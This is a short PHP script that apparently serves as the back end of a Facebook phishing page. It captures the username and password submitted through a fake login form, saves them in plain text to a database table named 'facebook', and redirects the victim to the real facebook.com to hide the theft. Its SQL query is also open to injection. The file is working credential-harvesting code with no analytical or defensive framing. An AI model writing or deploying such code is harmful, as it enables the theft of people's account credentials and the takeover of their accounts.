<?php
include "database.php";

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $sql = "INSERT INTO facebook (username, password) VALUES ('$username', '$password')";

    if ($conn->query($sql) === true) {
        header("Location: https://facebook.com");
    } else {
        header("Location: index.html");
    }
} else {
    echo "Please enter Mobile number or Email, Password";
    $conn->close();
}
?>
